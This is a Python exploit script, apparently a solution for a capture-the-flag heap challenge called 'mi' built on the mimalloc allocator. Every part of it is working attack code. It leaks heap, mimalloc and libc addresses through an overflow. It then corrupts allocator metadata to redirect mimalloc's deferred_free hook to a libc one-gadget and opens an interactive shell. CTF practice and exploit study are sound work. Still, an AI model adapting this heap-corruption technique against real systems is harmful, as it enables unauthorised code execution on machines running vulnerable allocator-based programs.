from ptrlib import *

def create(index, size):
    sock.sendlineafter(">>\n", "1")
    sock.sendlineafter("\n", str(index))
    sock.sendlineafter("\n", str(size))
    return

def write(index, data):
    sock.sendlineafter(">>\n", "2")
    sock.sendlineafter("\n", str(index))
    sock.sendafter("\n", data)
    return

def read(index):
    sock.sendlineafter(">>\n", "3")
    sock.sendlineafter("\n", str(index))
    return sock.recvline()

def delete(index):
    sock.sendlineafter(">>\n", "4")
    sock.sendlineafter("\n", str(index))
    return

libc = ELF("./libc.so.6")
libmi = ELF("./libmimalloc.so")
sock = Process("./mi", env={'LD_LIBRARY_PATH': './'})
#sock = Socket("mi.chal.ctf.westerns.tokyo", 10001)
libc_one_gadget = 0x10a38c

# leak heap
create(0, 0x20)
create(1, 0x20)
write(1, "1" * 0x20)
heap_base = u64(read(1)[0x20:]) - 0x16e0
logger.info("heap base = " + hex(heap_base))

# leak mi & libc
delete(0)
delete(1)
for i in range(0x7c):
    create(2, 0x20)
create(3, 0x20)
create(4, 0x20)
write(1, p64(heap_base + 0x88) + b'A'*0x18)
create(2, 0x20)
create(2, 0x20)
write(2, 'A' * 0x20)
libmi_base = u64(read(2)[0x20:]) - 0x2233c0
libc_base = libmi_base + 0x22a000
logger.info("libmi base = " + hex(libmi_base))
logger.info("libc base = " + hex(libc_base))
write(2, p64(0) * 3 + p64(0x20))

# overwrite deferred_free
delete(4)
delete(3)
ptr = heap_base + 0x2640 # list[3]->local_free == list[4]
write(4, p64(libmi_base + libmi.symbol("deferred_free")) + b"1"*0x18)
payload  = p64(libc_base + libc_one_gadget) # local_free
payload += p64(2)    # thread_freed
payload += p64(ptr)  # thread_free
payload += p64(0x20) # block_size
write(2, payload)

create(0, 0x20)
write(4, '\x00' * 0x20)
create(0, 0x20)
create(0, 0x20)

sock.interactive()

